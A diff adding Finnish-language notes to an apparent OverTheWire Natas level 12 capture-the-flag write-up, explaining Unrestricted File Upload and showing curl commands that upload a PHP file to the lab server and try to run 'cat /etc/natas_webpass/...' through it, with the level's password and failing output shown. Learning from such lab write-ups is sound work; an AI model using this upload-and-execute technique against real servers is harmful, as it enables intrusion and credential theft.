@@ -119,6 +119,12 @@ Näin _voila_ saattiin tämän seuraavan level 13 salasansa.
 
 ![alt text](./kuvat-level11-15/natas12-20.png)
 
+**Mini yhteenveto**:
+Tässä harjoituksessa tapahtuu tiedoston upottaminen, mutta siinä tapahtui haavoittuvuutta joka on nimellä (Unrestricted File Upload).
+
+<br><br>
+Unrestricted File Upload -haavoittuvuus syntyy, kun järjestelmä sallii käyttäjien ladata tiedostoja ilman asianmukaisia tarkistuksia, kuten tiedostotyypin tai koon rajoittamista. Jos tätä ei ole kontrolloitu, hyökkääjä voi ladata haitallisia tiedostoja, kuten skriptejä tai suoritettavia ohjelmia, jotka voivat vaarantaa järjestelmän. Kun haavoittuvuus on "exploitable", se tarkoittaa, että hyökkääjät voivat käyttää sitä käytännössä hyväkseen.
+
 ---
 
 ## Level 12 - 3 - Kali Linux steppi START HERE;
@@ -186,13 +192,69 @@ The file <a href="upload/0y159blw3m.php">upload/0y159blw3m.php</a> has been uplo
 </html>
 ```
 
+Huomataan tätä prosessia kuin (Unrestricted File Upload vulnerability is exploitable) ja tämä URL osuus, eli tämä: `upload/0y159blw3m.php`
+
+Seuraavissa tapahtuu tällainen URL komento ja pientä muutosta eli näin: <br>
+`http://natas12.natas.labs.overthewire.org/upload/0y159blw3m.php`
+
+<br>
+**Seuraavaksi** 
+kutsutaan *phpinfo()* jotakin käskyä, että selvitettään tämän hakemiston polkua `/etc/natas_webpass/natas13` ja muuttujansa mitä aikaisempi toistettiin toi *image.php*. 
+
+Tämä on kuin periaatteessa sama kuin eka kali linux testi: <br>
+```
+┌──(kali㉿kali)-[~]
+└─$ php -r '$p = file_get_contents("/etc/natas_webpass/natas13"); echo $p;'
+PHP Warning:  file_get_contents(/etc/natas_webpass/natas13): Failed to open stream: No such file or directory in Command line code on line 1
+``` 
+
+Nyt kun tarkistettaan se ainakin tiedoston *.php* on muuttunut
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas12", "pass": "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" };</script></head>
+<body>
+<h1>natas12</h1>
+<div id="content">
+The file <a href="upload/p3r5we5y0g.php">upload/p3r5we5y0g.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Normi tarkistusesta, et sijoitettaan toi `upload/p3r5we5y0g.php"` <br><br>
+
+`curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/p3r5we5y0g.php"`
 
 
+Tässä tapahtuu jotakin _error_ vikaa mutta pitäisi ehkä mennä uusiksi..
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB http://natas12.natas.labs.overthewire.org/upload/p3r5we5y0g.php
+<br />
+<b>Warning</b>:  Use of undefined constant keitto - assumed 'keitto' (this will throw an Error in a future version of PHP) in <b>/var/www/natas/natas12/upload/p3r5we5y0g.php</b> on line <b>1</b><br />
+keitto
 
 
+┌──(kali㉿kali)-[~]
+└─$ curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/p3r5we5y0g.php?keitto=cat%20/etc/natas_webpass/natas123"
+<br />
+<b>Warning</b>:  Use of undefined constant keitto - assumed 'keitto' (this will throw an Error in a future version of PHP) in <b>/var/www/natas/natas12/upload/p3r5we5y0g.php</b> on line <b>1</b><br />
+keitto                                                                                                                
+```
 
+![alt text](./kuvat-level11-15/natas12-kali-1.png)
 
-
+Tämä on sama kuin ylempi komento, mutta pieni de javu kuin visuallisessa selaimen versiossa..
 
 
 ## Level 12 - 4 - vinkkejä ja ohjeita:
